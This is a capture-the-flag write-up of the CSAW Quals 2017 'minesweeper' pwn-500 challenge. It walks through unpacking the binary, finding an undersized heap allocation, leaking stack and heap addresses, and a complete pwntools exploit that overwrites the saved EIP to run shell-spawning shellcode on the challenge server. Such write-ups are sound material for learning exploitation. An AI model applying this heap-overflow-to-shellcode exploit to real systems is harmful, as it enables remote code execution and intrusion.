{"pageContext":{"html":"<p><a href=\"ctf=csaw-quals-2017\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=arbitrary-size\"></a>\n<a href=\"techniques=shellcode\"></a></p>\n<h1>minesweeper (pwn-500)</h1>\n<p><a href=\"/minesweeper-61f0c15cb243842b89dbe6a83c0a361a.\">Binary</a></p>\n<pre><code class=\"language-bash\">$ file minesweeper\nminesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped\n</code></pre>\n<p>This solution would make you think that this challenge was not worth 500. Lets solve it without reversing the binary at all. The binary is UPX packed, so we first unpack it.</p>\n<pre><code class=\"language-bash\">$ cp minesweeper upx\n$ upx -d upx        \n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2013\nUPX 3.91        Markus Oberhumer, Laszlo Molnar &#x26; John Reiser   Sep 30th 2013\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n     13132 &#x3C;-      7936   60.43%  netbsd/elf386  upx\n\nUnpacked 1 file.\n$ file upx\nupx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=90ec16e6be18b19942bf2952db17a7c1ed3ca482, stripped\n$ checksec upx\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre>\n<p>This makes more sense. A pwn worth 500 with no protections??? seriously??\nWhen we run it it says server started. <code>netstat</code> tells the port to be 31337. The process wais for a connection and then forks.\nI connect to the port and attach gdb to the child.</p>\n<pre><code class=\"language-bash\">nc 127.0.0.1 31337\n\nHi. Welcome to Minesweeper. Please select an option:\n1) N (New Game)\n2) Initialize Game(I)\n3) Q (Quit)\nI\nPlease enter in the dimensions of the board you would like to set in this format: B X Y\nB 10 10\n</code></pre>\n<p>On the binary's STDOUT it said <code>Allocated buffer of size: 81</code>.\nThe problem is obvious now, it should have allocated 100 bytes instead.\nWe can send in our input which will be copied to the buffer, so its probably an out of bounds write. Using <code>cyclic</code> from the awesome pwntools I send a payload <code>'XXXX'+cyclic(96)</code>. It crashed!</p>\n<pre><code class=\"language-bash\">Program received signal SIGSEGV, Segmentation fault.\n0x08049855 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n[────────────────────────────────────REGISTERS─────────────────────────────────────]\n*EAX  0x61616176 ('vaaa')\n*EBX  0x0\n*ECX  0x4\n*EDX  0x61616177 ('waaa')\n EDI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */\n*ESI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */\n*EBP  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...\n*ESP  0xffcc58f0 ◂— 0x0\n*EIP  0x8049855 ◂— mov    dword ptr [eax + 8], edx\n[──────────────────────────────────────DISASM──────────────────────────────────────]\n ► 0x8049855    mov    dword ptr [eax + 8], edx\n   0x8049858    mov    eax, dword ptr [ebp + 8]\n   0x804985b    mov    eax, dword ptr [eax + 8]\n   0x804985e    mov    edx, dword ptr [ebp - 0x10]\n   0x8049861    mov    dword ptr [eax + 4], edx\n   0x8049864    mov    eax, dword ptr [stderr]       &#x3C;0x804bdbc>\n   0x8049869    push   eax\n   0x804986a    push   9\n   0x804986c    push   1\n   0x804986e    push   0x804a87c\n   0x8049873    call   fwrite@plt                    &#x3C;0x80486a0>\n[──────────────────────────────────────STACK───────────────────────────────────────]\n00:0000│ esp  0xffcc58f0 ◂— 0x0\n01:0004│      0xffcc58f4 —▸ 0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */\n02:0008│      0xffcc58f8 ◂— 0x61616176 ('vaaa')\n03:000c│      0xffcc58fc ◂— 0x61616177 ('waaa')\n04:0010│      0xffcc5900 ◂— 0x4\n05:0014│      0xffcc5904 —▸ 0x8f90024 ◂— 0x58585858 ('XXXX')\n06:0018│ ebp  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...\n07:001c│      0xffcc590c —▸ 0x80499ea ◂— add    esp, 0x10\n[────────────────────────────────────BACKTRACE─────────────────────────────────────]\n ► f 0  8049855\n   f 1  80499ea\n   f 2  8049526\n   f 3  80496b0\n   f 4  8049b75\n   f 5  8049d96\n   f 6 f755e637 __libc_start_main+247\nProgram received signal SIGSEGV (fault address 0x6161617e)\npwndbg>\n</code></pre>\n<p><code>eax</code> holds data at offset 88 and <code>edx</code> at 92. This would give us a very clean write-what-where. However there's a catch, contnuing execution to <code>0x8049861</code> shows that another write primitive with <code>eax</code>=<code>edx</code>. This could fuck up the clean primitive we had to write as now we need the <code>what</code> and <code>where</code> regions to be writable.</p>\n<p>The input is saved on a custom heap with rwxp. Come on! Its 2017!</p>\n<pre><code>0x8f90000  0x8f91000 rwxp     1000 0      [heap]\n</code></pre>\n<p>A straight leak is also available when you view the board in the game. I foud out that if you view the board without initializing the board, you leak stack and libc. When you view it with a small initialized board you can leak the heap. Now its easy!</p>\n<ul>\n<li>Leak the stack and heap.</li>\n<li>Initialize a board large enough to contain our shellcode and calculate save eip on the stack for the function which gives us the write primitive.</li>\n<li>Calculate shellcode's location on heap and replace eip with it.</li>\n</ul>\n<p>For shellcode I used awesome <code>pwntools</code> - <code>pwnlib.shellcraft.i386.linux.dupsh()</code>. It'll take the fd of your socket and dup() it with stdin and stdout and then give you a shell.</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux', log_level='info')\n\ns = remote('pwn.chal.csaw.io',7478)\n\nfor _ in xrange(5):\n    s.recvline()\ns.sendline(\"N\")\nfor _ in xrange(4):\n    s.recvline()\ns.sendline(\"V\")\ns.recvline()\nr = s.recv(144)\nprint len(r)\nstack = u32(r[91:95])\nsuccess(hex(stack))\ns.sendline(\"Q\")\nfor _ in xrange(5):\n    s.recvline()\ns.sendline('I')\ns.recvline()\ns.sendline(\"B 4 4\")\nfor _ in xrange(20):\n    s.recvline()\ns.sendline('X'*16)\nfor _ in xrange(12):\n    s.recvline()\ns.sendline('N')\nfor _ in xrange(4):\n    s.recvline()\ns.sendline('V')\ns.recvline()\nr = s.recv(0x20)\nheap = u32(r[15:19])\nsuccess(hex(heap))\nsleep(5)\nfor _ in xrange(5):\n    s.recvline()\nfor _ in xrange(5):\n    s.recvline()\ns.sendline(\"Q\")\nfor _ in xrange(5):\n    s.recvline()\ns.sendline('I')\ns.recvline()\ns.sendline(\"B 20 20\")\nfor _ in xrange(20):\n    s.recvline()\n\npayload = '\\xeb\\x06'+'X'*4+'\\x90'*2+asm('mov ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())\npayload += 'X'*(400-len(payload)-24)\npayload += p32(stack-47-8)+p32(heap+12)+'X'*16\n\ns.sendline(payload)\ns.interactive()\n</code></pre>\n<p>Easiest 500 points I ever scored!</p>","relativePath":"writeups/csaw-quals-2017/pwn/minesweeper/sudhackar"}}